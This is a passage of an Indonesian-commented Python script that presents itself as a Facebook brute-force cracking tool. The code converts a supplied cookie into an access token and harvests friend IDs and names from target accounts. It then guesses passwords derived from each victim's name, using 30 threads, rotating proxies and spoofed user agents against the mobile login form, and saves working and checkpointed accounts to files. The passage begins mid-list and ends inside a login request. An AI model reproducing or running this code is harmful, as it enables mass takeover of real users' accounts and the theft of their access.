05','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
	alohabrowser = 'Mozilla/5.0 (Linux; Android {}; {} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{}.0.{}.{} Mobile Safari/537.36 AlohaLite/1.7.3 AlohaBrowser/4.1.4'.format(versiandroid,models,versichrome1,versichrome2,versichrome3)
	alohabrowser = 'Mozilla/5.0 (Linux; Android {}; SM-{} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{}.0.{}.{} Mobile Safari/537.36 AlohaLite/1.7.3 AlohaBrowser/4.1.4'.format(versiandroid,sam,versichrome1,versichrome2,versichrome3)
	alohabrowser = 'Mozilla/5.0 (Linux; Android {}; {} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{}.0.{}.{} Mobile Safari/537.36 AlohaLite/1.7.3 AlohaBrowser/4.1.4'.format(versiandroid,sam1,versichrome1,versichrome2,versichrome3)
	useragentaloha = random.choice([alohabrowser])
	uaaloha.append(useragentaloha)
def waktu():
	now = datetime.datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi ðŸ‘‹"
	elif 12 <= hours < 15:timenow = "Selamat Siang ðŸ‘‹"
	elif 15 <= hours < 18:timenow = "Selamat Sore ðŸ‘‹"
	else:timenow = "Selamat Malam ðŸ‘‹"
	return timenow
###-----[ CLEAR DISPLAY ]-----###
def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass
def back():
	menu()
###-----[ LOGO BANNER ]-----###
def banner():
	print(f"""{P}
  ________________________________________
 /   _____/\______   \______   \_   _____/
 \_____  \  |       _/|    |  _/|    __)  
 /        \ |    |   \|    |   \|     \   
/_______  / |____|_  /|______  /\___  /   
        \/         \/        \/     \/    
 [{B}Script For Brute Facebook{P}]\n [{M}Coded By Rendra Guna Binawan{P}]\n [{U}Est.2021{P}]{P}""")
###-----[ LOGIN COOKIES ]-----###
def login():
	clear();banner()
	print(f"\n{P} [*] masukan cookie anda, disarankan menggunakan akun tumbal. {P}")
	print(f" [*] untuk menu crack tanpa login ,ketik 'nologin' pada kolom input.")
	cok = input(f" [*] cookie : {H}")
	if cok in ["Nologin","NOLOGIN","nologin"]:
		menu = input(f"\n{P} [1]. crack dari file. \n [2]. dump id dari email. \n [3]. dump id dari pencarian nama. \n [4]. cek hasil crack. \n [*] pilih 1/4 : ")
		if menu in ["01","1"]:
			Crack_file()
		elif menu in ["02","2"]:
			exit(" [*] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["03","3"]:
			exit(" [*] fitur ini masih dalam tahap pengembangan.")
		elif menu in ["04","4"]:
			Result()
		else:
			exit(" [*] input hanya dengan angka,jangan kosong.")
	else:
		try:
			url = "https://mbasic.facebook.com"
			data, data2 = {}, {}
			link = ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode = link["code"];user = link["user_code"]
			vers = par(ses.get(f"{url}/device", cookies={"cookie": cok}).content, "html.parser")
			item = ["fb_dtsg","jazoest","qr"]
			for x in vers.find_all("input"):
				if x.get("name") in item:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = par(ses.post(url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie": cok}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			ses.post(f"{url}{xzxz['action']}", data=data2, cookies={"cookie":cok})
			tokz = ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()
			open('t.txt', 'a').write(tokz['access_token']);open('c.txt', 'a').write(cok)
			exit(f"{P} [*] token : {H}{tokz['access_token']}{P} \n [*] cookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
		except Exception as e:exit(e)
###-----[ MENU SCRIPT ]-----###
def menu():
	clear();banner()
	try:
		token = open('t.txt','r').read()
		cok = open('c.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [*] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [*] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove("c.txt");os.remove("t.txt")
		except:pass
		print(f"\n{P} [*] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login()
	prints(f"\n[bold white] [*] uid  facebook : {uidfb} \n [*] nama facebook : {nama} \n [*] metode login  : [bold green]validate m.facebook.com{P2}")
	print(f"\n{P} [1]. crack dari id publik. \n [2]. crack dari id publik {H}massal disarankan{P}. \n [3]. crack id dari file. \n [4]. dump id ke file. \n [5]. cek hasil crack \n [6]. crack dari old id. \n [0]. keluar {M}hapus cookies{P}. {P}")
	menu = input(f'\n{P} [*] pilih 1/5 : ')
	if menu in ["01","1"]:
		try:
			token = open('t.txt','r').read()
			cok = open('c.txt','r').read()
		except IOError:
			exit()
		print(f"\n{P} [*] pastikan id target tidak private/publik. {P}")
		user_dump = input(f' [*] input id target : ')
		uid.append(user_dump)
		for userr in uid:
			try:
				col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
				for x in col['friends']['data']:
					try:
						sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
						sys.stdout.flush()
						id.append(x['id']+'|'+x['name'])
					except:continue
			except (KeyError,IOError):
				pass
			except requests.exceptions.ConnectionError:
				print(f' [*] koneksi buruk, silahkan refresh jaringan anda. ')
				exit()
		try:
			setting()
		except requests.exceptions.ConnectionError:
			print(f'\n [*] koneksi buruk, silahkan refresh jaringan anda. ')
			exit()
	elif menu in ["02","2"]:
		Dump_Massal()
	elif menu in ["03","3"]:
		Crack_file()
	elif menu in ["04","4"]:
		Dump_id()
	elif menu in ["05","5"]:
		Result()
	elif menu in ["06","6"]:
		Legendaris("SukaSukaGua")
	elif menu in ['00','0']:
		os.system('rm -rf t.txt')
		os.system('rm -rf c.txt')
		print(f' [*] Berhasil Keluar+Hapus Cookie ')
		exit()
	else:
		print(f" [*] input hanya dengan angka,jangan kosong.")
		time.sleep(3)
		back()
###-----[ MENU RESULT ]-----###
def Result():
	print(f"\n{P} [1]. cek hasil akun {H}Live{P}. \n [2]. cek hasil akun {K}Chek{P}. \n [3]. kembali.")
	lihat_result = input(f'\n [*] pilih 1/3 : ')
	if lihat_result in ['2']:
		try:vin = os.listdir('Chek')
		except FileNotFoundError:
			print(f' [*] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [*] anda tidak memiliki file {K}Check {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Chek/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {K}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [*] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [*] pilih dengan benar ')
				back()
			try:lin = open('Chek/'+geh,'r').read().splitlines()
			except:
				print(f' [*] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{K2}{result_[0]}|{result_[1]}[white]")
				prints(tree)
				nocp +=1
			print('')
			input(f' [*] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['1']:
		try:vin = os.listdir('Live')
		except FileNotFoundError:
			print(f' [*] file tidak ditemukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' [*] anda tidak memiliki file {H}Live {P}')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P} [%s]. %s ( {H}%s{P} id )'%(cih,isi,len(hem)))
			geeh = input(f'\n [*] masukan nomer result yang ingin anda cek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(f' [*] pilih dengan benar ')
				back()
			try:lin = open('Live/'+geh,'r').read().splitlines()
			except:
				print(f' [*] file tidak ditemukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				result_=lin[nocp].split('|')
				tree = Tree("")
				tree.add(f"{H2}{result_[0]}|{result_[1]}[white]").add(f"{H2}{result_[2]}[white]")
				prints(tree)
				nocp +=1
			print("")
			input(f' [*] ketik enter jika ingin kembali ke menu')
			os.system("clear")
			time.sleep(3)
			back()
	elif lihat_result in ['3']:
		back()
	else:
		print(f" [*] input hanya dengan angka,jangan kosong.")
		back()
###-----[ DUMP PUBLIK MASSAL ]-----###
def Dump_Massal():
	try:
		token = open('t.txt','r').read()
		cok = open('c.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [*] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [*] input jumlah target ? : '))
	except ValueError:
		print(f' [*] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [*] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [*] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [*] koneksi sinyal tidak stabil ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [*] koneksi sinyal tidak stabil ')
		back()
###-----[ DUMP OLD ]-----###
def Legendaris(SukaSukaGua):
	upil = 10000
	facebook = 100000
	print(f"\n [{M}!{P}] CONTOH AWAL UNTUK 7 DIGIT ({H}480{P}/{H}481{P})\n [{M}!{P}] CONTOH AWAL UNTUK 9 DIGIT ({H}5387{P}/{H}5380{P})\n [{M}!{P}] CONTOH AWAL UNTUK 5 DIGIT ({H}62{P}/{H}67{P})\n [{M}!{P}] {K}COBALAH BERIMAJINASI MERANGKAI AWALAN DIGIT OLD{P}")
	upilfacebook1 = input("\n [+] Digitan Awal   : ")
	upilfacebook = int(input(" [+] Jumlah Dump    : "))
	filename = input(" [+] Simpan File Di : ")
	try:
		with open(filename,"w") as file:
			for graha in range(upil,facebook):
				nugraha = random.randint(upilfacebook)
				gemblung = upilfacebook1
				uid.append(gemblung+str(nugraha))
				sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(uid)}{P} id....{P}"),
				sys.stdout.flush()
				file.write(gemblung+str(nugraha)+'|\n')
	except Exception as e:
		print(e)
###-----[ DUMP FILE ]-----###
def Dump_id():
	file = input(f"\n [*] masukan nama file dump anda : ")
	try:
		token = open('t.txt','r').read()
		cok = open('c.txt','r').read()
	except IOError:
		exit()
	try:
		print(f"\n{P} [*] pastikan id target tidak private/publik. {P}")
		jum = int(input(f' [*] input jumlah target ? : '))
	except ValueError:
		print(f' [*] input salah ')
		exit()
	if jum<1 or jum>100:
		print(f' [*] gagal dump id kemungkinan id bukan publik/private ')
		exit()
	ses=requests.Session()
	jumlah_input = 0
	for met in range(jum):
		jumlah_input+=1
		user_dump = input(f' [*] input id ke '+str(jumlah_input)+' : ')
		uid.append(user_dump)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for x in col['friends']['data']:
				try:
					sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
					sys.stdout.flush()
					id.append(x['id']+'|'+x['name'])
					open('Dump/'+file,'a').write(x['id']+'|'+x['name']+'\n')
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f' [*] koneksi sinyal tidak stabil ')
			exit()
	try:
		exit(f"\n [*] sukses dump file tersimpan pada : {file}")
	except KeyError:
		print(f"\n [*] gagal dump, kemungkinan id tidak publik/cookies anda invalid")
	except requests.exceptions.ConnectionError:
		print('')
		print(f' [*] koneksi sinyal tidak stabil ')
		back()
###-----[ CRACK FILE ]-----###
def Crack_file():
	file = input(f"\n [*] masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r [*] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f" [*] file tidak ada")
	setting()
###-----[ SETTING URUTAN & METODE ]-----###
def setting():
	print("")
	print(f"\n{P} [1]. urutan old ke new. \n [2]. urutan new ke old. \n [3]. urutan random. {P}")
	urutan_setting = input(f'\n [*] pilih 1/3 : ')
	if urutan_setting in ['1','01','old']:
		for tua in sorted(id):
			uid2.append(tua)
	elif urutan_setting in ['2','02','new']:
		muda=[]
		for new in sorted(id):
			muda.append(new)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			uid2.append(muda[bcmi])
			bcmi -=1
	elif urutan_setting in ['3','03','random']:
		for acak in id:
			xx = random.randint(0,len(uid2))
			uid2.insert(xx,acak)
	else:
		print(f" [*] input hanya dengan angka,jangan kosong.")
		exit()
	print(f"\n{P} [1]. password otomatis. \n [2]. password gabung. \n [3]. password manual. {P}")
	password_metode = input(f'\n [*] pilih 1/3 : ')
	if password_metode in ['1','01']:
		Otomatis()
	elif password_metode in ['2','02']:
		Gabung()
	elif password_metode in ['3','03']:
		Manual()
	else:
		print(f" [*] input hanya dengan angka,jangan kosong.")
		exit()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Otomatis():
	ua = input(f' [*] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [*] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [*] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [*] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [*] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [*] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pasw = []
			if len(nama)<6:
				if len(depan)<3:pass
				else:
					pasw.append(nama)
					pasw.append(depan+"321")
					pasw.append(depan+"123")
					pasw.append(depan+"1234")
					pasw.append(depan+"12345")
			else:
				if len(depan)<3:
					pasw.append(nama)
				else:
					pasw.append(nama)
					pasw.append(depan+"86")
					pasw.append(depan+"123")
					pasw.append(depan+"1234")
					pasw.append(depan+"12345")
			MethodeCrack.submit(RegularMbasic,uid,pasw)
	print("\r")
	exit(f"{P} [*] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD GABUNG ]-----###
def Gabung():
	pw_manual=input(f'\n [*] input password tambahan anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [*] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [*] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [*] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [*] {P}hasil Live akan tersimpan di : {H}OK/{okc}{P}
 [*] {P}hasil Chek akan tersimpan di : {K}CP/{cpc}{P}
 [*] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			try:
				if len(nama) <=5:
					if len(depan) <=1 or len(depan) <=2:pass
					else:
						pasw.append(nama)
						#pasw.append(depan[0]+depan[1])
						pasw.append(depan[0]+"123")
						pasw.append(depan[0]+"1234")
						pasw.append(depan[0]+"12345")
				else:
					pasw.append(nama)
					#pasw.append(depan[0]+depan[1])
					pasw.append(depan[0]+"123")
					pasw.append(depan[0]+"1234")
					pasw.append(depan[0]+"12345")
				for xpwd in pwnya:
					pasw.append(xpwd)
				MethodeCrack.submit(RegularMbasic,uid,pasw)
			except:pass
	print("\r")
	print(f"{P} [*] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ SETTING PASSWORD MANUAL ]-----###
def Manual():
	pw_manual=input(f'\n [*] input password manual anda : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f' [*] ingin menggunakan user agent manual ? y/t : ')
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = input(f' [*] input user agent manual anda : ');uadia.append(bz)
	if ua in ['t','T','']:
		print(f"{P} [*] anda menggunakan user agent bawaan script. {P}")
	else:uadarimu.append('uasc')
	print(f"""
 [*] {P}hasil Live akan tersimpan di : {H}Live/{okc}{P}
 [*] {P}hasil Chek akan tersimpan di : {K}Chek/{cpc}{P}
 [*] mainkan mode pesawat jika tidak ada hasil.
""")
	with tred(max_workers=30) as MethodeCrack:
		for user in uid2:
			uid,nama = user.split('|')[0],user.split('|')[1].lower()
			depan = nama.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			MethodeCrack.submit(RegularMbasic,uid,pasw)
	print("\r")
	exit(f"{P} [*] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")
###-----[ METODE REGULAR ORIGINAL ]-----###
def RegularMbasic(uid,pasw):
	global loop,ok,cp
	for i in list('\|-/'):
		sys.stdout.write(f"\r [{H}/{P}] Crack {M}{str(loop)}{P}/{H}{len(uid2)}{P} OK : {H}{ok}{P} CP : {K}{cp}{P}"),
		sys.stdout.flush()
	ua = random.choice(uaaloha)
	ua2 = random.choice(LegendOfHejo)
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ua
			nip=random.choice(prokis)
			proxs= {'http': 'socks4://'+nip}
			url = "m.facebook.com"
			ses.headers.update({
'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'sec-ch-ua-mobile': '?1',
'upgrade-insecure-requests': '1',
'user-agent': ua2,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'navigate',
'sec-fetch-dest': 'document',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			link = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1036341366506456&kid_directed_site=0&app_id=1036341366506456&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1036341366506456%26cbt%3D1691875771319%26e2e%3D%257B%2522init%2522%253A1691875771319%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3Dba5b8a3e-22f1-4572-9f83-eea66475502d%26scope%3Dopenid%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.tencent.ig%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2ec8f0a8-7804-4563-85bd-94cf063c4c7b%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.tencent.ig%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
"lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"jazoest": re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
"m_ts": re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
"li": re.search('name="li" value="(.*?)"',str(link.text)).group(1),
"try_number": re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
"email": uid,
"masked_cp": uid,
"pass": pw,
"login": "Masuk",
"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
}
			headers_post = {
"Host": "mbasic.facebook.com",
"content-length": str(sys.getsizeof(data)), #"193",
"cache-control": "max-age=0",
"dpr": "2.549999952316284",
"viewport-width": "980",
"sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
"sec-ch-ua-mobile": "?1",
"sec-ch-ua-platform": '"Android"',
"sec-ch-ua-platform-version": '"9.0.0"',
"sec-ch-ua-model": '"ASUS_X00TD"',
"sec-ch-ua-full-version-list": '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.196", "Google Chrome";v="114.0.5735.196"',
"sec-ch-prefers-color-scheme": "light",
"upgrade-insecure-requests": "1",
"origin": "https://mbasic.facebook.com",
"content-type": "application/x-www-form-urlencoded",
"user-agent": ua,
"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "navigate",
"sec-fetch-user": "?1",
"sec-fetch-dest": "document",
"referer": "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1036341366506456&kid_directed_site=0&app_id=1036341366506456&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1036341366506456%26cbt%3D1691875771319%26e2e%3D%257B%2522init%2522%253A1691875771319%257D%26ies%3D1%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3Dba5b8a3e-22f1-4572-9f83-eea66475502d%26scope%3Dopenid%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.tencent.ig%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D2ec8f0a8-7804-4563-85bd-94cf063c4c7b%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.tencent.ig%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25222ec8f0a8-7804-4563-85bd-94cf063c4c7b%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25221g6mpqlj3d2765tu7dji%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
